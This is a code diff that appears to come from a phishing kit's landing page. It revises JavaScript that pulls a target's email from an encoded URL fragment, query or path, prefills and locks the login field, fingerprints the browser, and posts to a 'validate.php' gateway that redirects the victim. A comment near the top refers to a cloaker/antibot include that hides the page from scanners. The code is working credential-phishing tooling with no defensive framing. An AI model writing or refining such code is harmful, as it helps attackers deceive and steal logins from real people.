@@ -118,87 +118,84 @@ require_once __DIR__ . '/includes/index.php'; // your cloaker/antibot
   
 
 
- <script>
+<script>
 document.addEventListener('DOMContentLoaded', () => {
-  // ---------- Tiny helpers ----------
   const $ = id => document.getElementById(id);
   const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v).trim());
   const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
   const hide = n => { if (!n) return; n.style.display = 'none'; };
 
-  // ---------- i18n (EN/FR) ----------
+  // i18n
   const LANG = ((navigator.languages && navigator.languages[0]) || navigator.language || 'en').slice(0,2).toLowerCase();
   const T = {
-    en: {
-      invalidEmail: 'Please enter a valid email address.',
-      errorGeneric: 'Something went wrong. Please try again.',
-      redirecting: 'Redirecting…',
-      next: 'Continue',
-      placeholder: 'username@company.com'
-    },
-    fr: {
-      invalidEmail: 'Veuillez saisir une adresse e-mail valide.',
-      errorGeneric: 'Une erreur est survenue. Merci de réessayer.',
-      redirecting: 'Redirection…',
-      next: 'Continuer',
-      placeholder: 'nom@entreprise.com'
-    }
+    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Redirecting…', next:'Continue', placeholder:'username@company.com' },
+    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.', errorGeneric:'Une erreur est survenue. Merci de réessayer.', redirecting:'Redirection…', next:'Continuer', placeholder:'nom@entreprise.com' }
   };
   const t = T[LANG] || T.en;
 
-  // ---------- Endpoint ----------
-  const gateway = 'z/validate.php'; // your PHP validator
-
-  // ---------- DOM refs ----------
+  // DOM
   const form     = $('verifyForm');
   const input    = $('email');
   const errBox   = $('err');
   const submitEl = $('submitBtn') || $('continueBtn');
+  const gateway  = 'z/validate.php';
 
-  // ---------- Prevent placeholder flash; set language placeholder later ----------
-  if (input) input.setAttribute('placeholder', '');
-
-  // ---------- Base64url decode ----------
-  function b64urlDecode(s) {
+  // Base64url decode
+  const b64urlDecode = (s) => {
     try {
-      let str = (s || '').replace(/-/g, '+').replace(/_/g, '/');
-      // pad
+      let str = String(s || '').replace(/-/g,'+').replace(/_/g,'/');
       str += '==='.slice((str.length + 3) % 4);
       return atob(str);
     } catch { return ''; }
-  }
+  };
 
-  // ---------- Auto-grab email from URL (#, $, or ?e=) ----------
-  function emailFromURL() {
+  // Robust auto-grab:
+  // - hash   → https://site/page#<b64url>
+  // - dollar → https://site/page$<b64url>
+  // - query  → https://site/page?e=<b64url>
+  // - path   → last segment as fallback (handles your sample URL form)
+  const emailFromURL = () => {
     const href = String(location.href);
     let encoded = null;
 
-    const hashIdx = href.indexOf('#');
-    if (hashIdx !== -1) encoded = href.slice(hashIdx + 1);
+    // 1) fragment
+    const h = location.hash ? location.hash.slice(1) : '';
+    if (h) encoded = h;
 
+    // 2) dollar marker
     if (!encoded) {
-      const dollarIdx = href.lastIndexOf('$');
-      if (dollarIdx !== -1) encoded = href.slice(dollarIdx + 1);
+      const i = href.lastIndexOf('$');
+      if (i !== -1) encoded = href.slice(i + 1);
     }
 
+    // 3) query ?e=
     if (!encoded) {
       const p = new URLSearchParams(location.search);
       if (p.has('e')) encoded = p.get('e');
     }
 
-    if (!encoded) return null;
+    // 4) last path segment fallback (e.g., your sample link)
+    if (!encoded) {
+      const segs = location.pathname.split('/').filter(Boolean);
+      if (segs.length) encoded = segs[segs.length - 1];
+    }
 
+    if (!encoded) return null;
     const email = b64urlDecode(encoded);
     return looksLikeEmail(email) ? email.toLowerCase() : null;
-  }
+  };
 
+  // Prevent placeholder flash: leave blank now; fill later only if needed
+  if (input && input.getAttribute('placeholder') == null) input.setAttribute('placeholder','');
+
+  // Try to auto-fill from URL
   const autograb = emailFromURL();
   if (autograb && input) {
     input.value = autograb;
-    input.readOnly = true; // optional: lock after auto-fill
+    input.readOnly = true; // optional: lock if prefilled
   }
 
-  // ---------- Fingerprint (optional) ----------
+  // Basic fingerprint (optional)
   let fpHash = '';
   (async () => {
     try {
@@ -208,7 +205,7 @@ document.addEventListener('DOMContentLoaded', () => {
     } catch {}
   })();
 
-  // ---------- Button state ----------
+  // Button state helpers
   const setBtn = (enabled, label) => {
     if (!submitEl) return;
     submitEl.disabled = !enabled;
@@ -221,12 +218,13 @@ document.addEventListener('DOMContentLoaded', () => {
     setBtn(looksLikeEmail(input.value), t.next);
   });
 
-  // ---------- Submit flow ----------
+  // Submit
   form?.addEventListener('submit', async (e) => {
     e.preventDefault();
 
     const val  = (input?.value || '').trim().toLowerCase();
     const trap = ($('middleName')?.value || '').trim(); // honeypot must be empty
+
     if (!looksLikeEmail(val)) return show(errBox, t.invalidEmail);
     if (trap) return; // bot
 
@@ -256,7 +254,6 @@ document.addEventListener('DOMContentLoaded', () => {
 
       if (res.ok && json.valid && json.redirect) {
         setBtn(false, t.redirecting);
-        // small delay for UX; go!
         setTimeout(() => { location.assign(json.redirect); }, 500);
       } else {
         const msg = (json && (json.message || json.detail))
@@ -273,10 +270,11 @@ document.addEventListener('DOMContentLoaded', () => {
     }
   });
 
-  // ---------- Final touch: set localized placeholder after autograb ----------
+  // Set localized placeholder only if not auto-filled (prevents flash)
   if (input && !input.value) input.setAttribute('placeholder', t.placeholder);
 });
 </script>
+
 
 </body>
 </html>
